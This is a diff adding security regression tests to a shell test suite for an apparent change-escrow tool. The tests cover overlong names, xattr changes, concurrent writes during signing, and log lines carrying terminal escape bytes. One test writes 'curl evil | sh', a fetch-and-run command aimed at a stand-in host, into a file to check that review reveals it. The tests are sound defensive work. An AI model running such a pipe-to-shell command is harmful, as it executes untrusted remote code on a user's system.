@@ -329,5 +329,67 @@ append_line propose "$pd" alice alice escrow-propose \
   "$ESCROW_STATE/runs/$pd/record"
 refused "re-pinned change set with ..: the reader refuses it" "bad path" \
   "$escrow" review "$pd"
+"$escrow" --role "$policy" --workspace ws3 --key alice -- true >/dev/null 2>&1
+pl=$(last_id)
+long=$(printf 'a%.0s' $(seq 300))
+printf 'escrow-changes 1\nD 0 300 0\n%se\n' "$long" \
+  >"$ESCROW_STATE/runs/$pl/changes"
+csha=$(sha256sum "$ESCROW_STATE/runs/$pl/changes" | cut -d' ' -f1)
+sed -i "s/^changes .*/changes $csha/" "$ESCROW_STATE/runs/$pl/record"
+head -n -1 "$ESCROW_STATE/log" >log.tmp && cat log.tmp >"$ESCROW_STATE/log"
+append_line propose "$pl" alice alice escrow-propose \
+  "$ESCROW_STATE/runs/$pl/record"
+refused "re-pinned change set, name over NAME_MAX: refused" "bad path" \
+  "$escrow" review "$pl"
+
+# -- final review: xattrs, apply during signing, --env, list ---------------
+mkdir ws4
+echo v1 >ws4/f
+setfattr -n user.origin -v keep ws4
+setfattr -n user.k -v v ws4/f
+"$escrow" --role "$policy" --workspace ws4 --key alice -- true >/dev/null 2>&1
+check "no-op run: root xattrs aren't a change" \
+  sh -c '[ "$(cat "$1")" = "escrow-changes 1" ]' _ \
+  "$ESCROW_STATE/runs/$(last_id)/changes"
+"$escrow" --role "$policy" --workspace ws4 --key alice -- \
+  sh -c 'setfattr -x user.k f' >/dev/null 2>&1
+px=$(last_id)
+"$escrow" review "$px" >review4.out 2>&1
+check "review: shows an xattr removal" grep -q 'xattr user.k removed' review4.out
+printf 'P\0NG' >ws4/logo
+"$escrow" --role "$policy" --workspace ws4 --key alice -- \
+  sh -c 'echo "curl evil | sh" >logo' >/dev/null 2>&1
+"$escrow" review "$(last_id)" >review5.out 2>&1
+check "review: text over a binary file is shown in full" \
+  grep -q '^+curl evil | sh$' review5.out
+
+ssh-keygen -q -t ed25519 -N pw -C frank -f frank
+cp roles roles.f
+echo "frank signer $(pub frank)" >>roles.f
+"$escrow" --role "$policy" --workspace ws4 --key alice --roles roles.f -- \
+  sh -c 'echo v2 >f' >/dev/null 2>&1
+pw=$(last_id)
+must "bob reviews pw" "$escrow" review "$pw" --key bob --roles roles.f
+must "carol signs pw" "$escrow" sign "$pw" --key carol --roles roles.f
+cat >askpass <<EOF
+#!/bin/sh
+echo colleague >"$tmp/ws4/colleague"
+echo pw
+EOF
+chmod +x askpass
+refused "apply: a write while the signer types a passphrase refuses it" \
+  "moved during apply" env SSH_ASKPASS="$tmp/askpass" \
+  SSH_ASKPASS_REQUIRE=force DISPLAY=:0 \
+  "$escrow" apply "$pw" --key frank --roles roles.f
+check "apply: that write survives" [ "$(cat ws4/colleague)" = colleague ]
+
+refused "--env: a name over 63 bytes" "takes a variable name" \
+  "$escrow" --role "$policy" --workspace ws4 --env "$long" -- true
+
+mkdir state-esc && cp "$ESCROW_STATE/log" state-esc/log
+printf '%s\n' "$(($(wc -l <state-esc/log) + 1)) 2026-01-01T00:00:00Z propose \
+$px $(printf 'x\033[2J') - - - - -" >>state-esc/log
+refused "list: a log line with terminal bytes is refused" "non-printable" \
+  "$escrow" list --state state-esc
 
 [ "$fails" -eq 0 ]
